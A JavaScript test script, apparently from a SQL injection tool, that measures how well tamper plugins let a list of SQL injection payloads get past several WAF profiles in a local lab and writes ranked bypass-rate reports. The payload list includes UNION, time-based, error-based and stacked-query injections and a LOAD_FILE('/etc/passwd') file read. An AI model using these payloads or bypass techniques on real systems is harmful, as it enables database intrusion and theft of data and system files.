// e2e/waf-lab/validate-tamper.mjs
// 通过真实 HTTP 请求验证 tamper 绕过效果
// 启动 WAF 实验室 → 对每个 tamper 插件发送 payload → 记录绕过率

import { createRequire } from 'module';
import { existsSync, mkdirSync, writeFileSync } from 'fs';
import { resolve, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);

// 导入 tamper 和 WAF lab
const { tamperRegistry } = require('../../server/src/core/tamper/TamperRegistry.js');
const { applyTampers } = require('../../server/src/core/tamper/applyTampers.js');
const { createLabApp } = require('./lab-server-v2.js');
const { PROFILES } = require('./waf-profiles.js');

// 测试 payloads（每种技术的典型 payload）
const TEST_PAYLOADS = [
  // UNION 注入
  { id: 'union_basic', payload: "1 UNION SELECT 1,2,3-- -", technique: 'union' },
  { id: 'union_all', payload: "1 UNION ALL SELECT 1,2,3-- -", technique: 'union' },
  // 布尔注入
  { id: 'or_true', payload: "1 OR 1=1-- -", technique: 'boolean' },
  { id: 'and_true', payload: "1 AND 1=1-- -", technique: 'boolean' },
  { id: 'or_false', payload: "1 OR 1=2-- -", technique: 'boolean' },
  // 时间盲注
  { id: 'sleep', payload: "1 AND SLEEP(5)-- -", technique: 'time' },
  { id: 'benchmark', payload: "1 OR BENCHMARK(1000000,MD5(1))-- -", technique: 'time' },
  // 报错注入
  { id: 'extractvalue', payload: "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()))-- -", technique: 'error' },
  { id: 'updatexml', payload: "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)-- -", technique: 'error' },
  // 堆叠查询
  { id: 'stacked', payload: "1; SELECT 1,2,3-- -", technique: 'stacked' },
  // 信息收集
  { id: 'info_schema', payload: "1 UNION SELECT 1 FROM information_schema.tables-- -", technique: 'union' },
  // 文件读取
  { id: 'load_file', payload: "1 UNION SELECT LOAD_FILE('/etc/passwd')-- -", technique: 'union' },
  // 十六进制
  { id: 'hex', payload: "1 WHERE name=0x61646d696e-- -", technique: 'boolean' },
  // CHAR 函数
  { id: 'char_func', payload: "1 WHERE name=CHAR(97,98,99)-- -", technique: 'boolean' },
];

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function runTest() {
  const allPlugins = tamperRegistry.list().map(t => t.name);
  console.log(`[validate-tamper] 已注册 ${allPlugins.length} 个 tamper 插件`);
  console.log(`[validate-tamper] 测试 payload: ${TEST_PAYLOADS.length} 个\n`);

  const results = {
    timestamp: new Date().toISOString(),
    totalPlugins: allPlugins.length,
    totalPayloads: TEST_PAYLOADS.length,
    totalProfiles: PROFILES.length,
    profiles: {},
  };

  for (const profile of PROFILES) {
    console.log(`\n========== Profile: ${profile.name} ==========`);
    const app = createLabApp(profile.id);
    const server = app.listen(0); // 随机端口
    const port = server.address().port;
    const base = `http://127.0.0.1:${port}`;

    const profileResults = {};

    // 测试每个插件
    for (const pluginName of allPlugins) {
      const pluginR = { bypassCount: 0, totalBlocked: 0, details: [] };

      for (const tp of TEST_PAYLOADS) {
        // 原始 payload 是否被拦截
        const origUrl = `${base}/vuln?id=${encodeURIComponent(tp.payload)}`;
        let origBlocked = false;
        try {
          const origRes = await fetch(origUrl);
          origBlocked = origRes.status === 403;
        } catch { origBlocked = true; }

        if (!origBlocked) continue; // 原始 payload 不被拦截，无需测试

        pluginR.totalBlocked++;

        // 应用 tamper
        let transformed = tp.payload;
        try {
          transformed = applyTampers(tp.payload, {}, [pluginName]);
        } catch (e) {
          pluginR.details.push({ payloadId: tp.id, error: e.message });
          continue;
        }

        // 绕过后的 payload 是否被拦截
        const tamperUrl = `${base}/vuln?id=${encodeURIComponent(transformed)}`;
        let stillBlocked = true;
        try {
          const tamperRes = await fetch(tamperUrl);
          stillBlocked = tamperRes.status === 403;
        } catch { stillBlocked = true; }

        if (!stillBlocked) pluginR.bypassCount++;

        pluginR.details.push({
          payloadId: tp.id,
          technique: tp.technique,
          originalBlocked: true,
          bypassed: !stillBlocked,
          payloadPreview: tp.payload.substring(0, 40),
          transformedPreview: transformed.substring(0, 40),
        });
      }

      const bypassRate = pluginR.totalBlocked > 0
        ? Math.round((pluginR.bypassCount / pluginR.totalBlocked) * 100)
        : 0;
      profileResults[pluginName] = {
        bypassRate,
        bypassCount: pluginR.bypassCount,
        totalBlocked: pluginR.totalBlocked,
        details: pluginR.details,
      };

      if (pluginR.totalBlocked > 0) {
        process.stdout.write(`\r  ${pluginName.padEnd(25)} bypass: ${`${bypassRate}%`.padEnd(4)} (${pluginR.bypassCount}/${pluginR.totalBlocked})`);
      }
    }

    // 按绕过率排序
    const sorted = Object.entries(profileResults)
      .filter(([, v]) => v.totalBlocked > 0)
      .sort((a, b) => b[1].bypassRate - a[1].bypassRate || b[1].bypassCount - a[1].bypassCount);

    console.log(`\n\n  结果: ${profile.name}`);
    console.log(`  ${'='.repeat(50)}`);
    console.log(`  Top-10 最有效插件:`);
    for (const [name, r] of sorted.slice(0, 10)) {
      console.log(`    ${name.padEnd(25)} ${r.bypassRate}% (${r.bypassCount}/${r.totalBlocked})`);
    }

    results.profiles[profile.id] = {
      name: profile.name,
      totalPlugins: allPlugins.length,
      effectivePlugins: sorted.filter(([, v]) => v.bypassRate > 0).length,
      topPlugins: sorted.slice(0, 20).map(([n, r]) => ({ name: n, bypassRate: r.bypassRate, count: `${r.bypassCount}/${r.totalBlocked}` })),
      plugins: profileResults,
    };

    server.close();
    await sleep(500);
  }

  // 输出
  const outDir = resolve(__dirname, 'results');
  if (!existsSync(outDir)) mkdirSync(outDir, { recursive: true });

  writeFileSync(resolve(outDir, 'validate.json'), JSON.stringify(results, null, 2));

  // Markdown 报告
  let md = `# WAF 绕过验证报告（HTTP 实测）

> 生成时间：${results.timestamp}
> 测试插件：${results.totalPlugins} 个
> 测试 payload：${results.totalPayloads} 个
> WAF 场景：${results.totalProfiles} 个

---

## 汇总对比

| WAF 场景 | 有效插件 | Top-3 |
|---------|---------|-------|
`;
  for (const profile of PROFILES) {
    const pr = results.profiles[profile.id];
    const top3 = pr.topPlugins.slice(0, 3).map(p => `${p.name}(${p.bypassRate}%)`).join(', ');
    md += `| ${pr.name} | ${pr.effectivePlugins}/${pr.totalPlugins} | ${top3} |\n`;
  }

  md += `\n## 各场景详情\n\n`;

  for (const profile of PROFILES) {
    const pr = results.profiles[profile.id];
    md += `### ${pr.name}\n\n`;
    md += `| 排名 | 插件名 | 绕过率 | 绕过/拦截 |\n|------|--------|--------|----------|\n`;
    for (let i = 0; i < Math.min(pr.topPlugins.length, 20); i++) {
      const p = pr.topPlugins[i];
      md += `| ${i + 1} | ${p.name} | ${p.bypassRate}% | ${p.count} |\n`;
    }
    md += '\n';
  }

  // 跨场景最佳通用插件
  md += `## 最佳通用插件（跨场景）\n\n`;
  const pluginAcrossProfiles = {};
  for (const [, pref] of Object.entries(results.profiles)) {
    for (const [pluginName, pr] of Object.entries(pref.plugins)) {
      if (!pluginAcrossProfiles[pluginName]) pluginAcrossProfiles[pluginName] = [];
      pluginAcrossProfiles[pluginName].push(pr.bypassRate);
    }
  }
  const avgPlugin = Object.entries(pluginAcrossProfiles)
    .map(([name, rates]) => ({ name, avg: Math.round(rates.reduce((a, b) => a + b, 0) / rates.length), rates }))
    .sort((a, b) => b.avg - a.avg);

  md += `| 插件名 | 平均绕过率 | 各场景 |\n|--------|-----------|-------|\n`;
  for (const p of avgPlugin.slice(0, 15)) {
    const rates = p.rates.map((r, i) => `${PROFILES[i].id}=${r}%`).join(', ');
    md += `| ${p.name} | ${p.avg}% | ${rates} |\n`;
  }

  writeFileSync(resolve(outDir, 'validate.md'), md);

  console.log(`\n\n[validate-tamper] 完成！`);
  console.log(`  结果已写入:`);
  console.log(`    ${resolve(outDir, 'validate.json')}`);
  console.log(`    ${resolve(outDir, 'validate.md')}`);
}

runTest().catch(console.error);